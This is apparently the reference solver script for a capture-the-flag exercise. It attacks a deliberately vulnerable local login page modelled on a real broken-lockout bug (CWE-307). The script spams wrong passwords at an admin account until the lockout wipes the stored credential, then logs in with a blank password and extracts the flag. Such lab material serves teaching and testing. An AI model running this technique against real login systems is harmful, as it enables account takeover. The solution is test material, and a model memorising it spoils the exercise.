#!/usr/bin/env python3
"""Operation 04 reference solver — Thermite blows through Oryx's broken lockdown.

There is nothing to guess here. The real password is random and never disclosed
on purpose. The actual break-in is: spam wrong passwords against the confirmed
admin account ON PURPOSE, cross the app's own failure threshold, and discover
that its "lockout" doesn't lock the account -- it wipes the stored credential to
an empty string instead. Then just log in with a blank password.

This mirrors a real, publicly disclosed bug class (Tiki Wiki CMS, CWE-307): the
control meant to stop repeated failures became a second way in once triggered.

The attack flow below is exactly the blackbox version of it: watch the response
change as the failure count climbs, recognize the threshold being crossed, then
try the one password an attacker would never normally think to send -- none.

Usage: python3 op4.py [base_url]     (default http://localhost:8000)
"""
import sys, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
USER = "g.mendel"


def attempt(sess, password):
    return sess.post(f"{BASE}/op4/login", data={"username": USER, "password": password})


def main():
    sess = requests.Session()
    print(f"[*] spamming wrong passwords against {USER} on purpose -- watching the message\n")

    seen_notice = False
    for i in range(1, 60):
        r = attempt(sess, f"wrong-guess-{i}")
        if "administrator re-authentication" in r.text:
            print(f"[!] attempt {i}: message changed -> \"Account requires administrator re-authentication.\"")
            print("[!] that's the threshold -- the stored credential should be wiped now, not the account locked")
            break
        if "security notification" in r.text and not seen_notice:
            print(f"[*] attempt {i}: decoy message shift -> \"A security notification has been dispatched...\"")
            print("    (this alone isn't the vulnerability -- keep going)")
            seen_notice = True
    else:
        print("[!] never saw the threshold message in 59 tries -- is the app up?")
        return

    print("\n[*] logging in with a BLANK password now that the credential should be wiped...")
    r = sess.post(f"{BASE}/op4/login", data={"username": USER, "password": ""}, allow_redirects=False)
    if r.status_code == 302:
        console = sess.get(f"{BASE}/op4/console")
        flag = re.search(r"R6S\{[^}]*\}", console.text)
        if flag:
            print(f"[+] IN with an EMPTY password: {flag.group(0)}")
            print("[+] Operation 05 is now unlocked at Command.")
            return
    print("[!] blank-password login failed -- the account may not have crossed the threshold yet")


if __name__ == "__main__":
    main()
